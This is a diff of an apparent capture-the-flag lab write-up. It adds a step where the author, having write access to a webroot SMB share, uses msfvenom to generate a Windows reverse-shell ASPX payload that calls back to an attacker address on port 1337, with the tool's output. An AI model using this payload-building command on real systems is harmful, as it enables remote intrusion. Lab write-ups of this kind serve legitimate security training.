@@ -498,7 +498,20 @@ SMB         10.129.228.120  445    G0               Web             READ,WRITE
 Now i have write access on `Web` which as previously identified is where the webroot is held so i should be able to make a reverse shell as this user
 
 # Reverse shell as `svc_apache`
+```python
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.90 LPORT=1337 -f aspx -o shell.aspx 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of aspx file: 3388 bytes
+Saved as: shell.aspx
+```
+This generate me a rev shell 
 
+```python
+
+```
 
 ```python
 
